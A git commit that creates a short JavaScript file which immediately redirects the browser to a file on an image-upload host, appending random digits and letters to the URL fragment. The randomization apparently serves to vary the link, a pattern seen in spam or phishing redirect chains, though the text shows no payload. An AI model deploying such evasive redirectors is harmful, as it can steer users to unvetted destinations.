349c89b286ad83c50f812f46b364b7ec8ea2cd79
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-05-09 23:13:51 +0800

    Create 2xinleitz.js

---
+++ 2xinleitz.js
@@ -0,0 +1,17 @@
+var urls=[
+' https://uploadfiles.nowcoder.com/images/20240509/522114074_1715267527659/0B2FF233A56B25328251A9577933BBC0#{nnnnnnn}{wwww}',
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
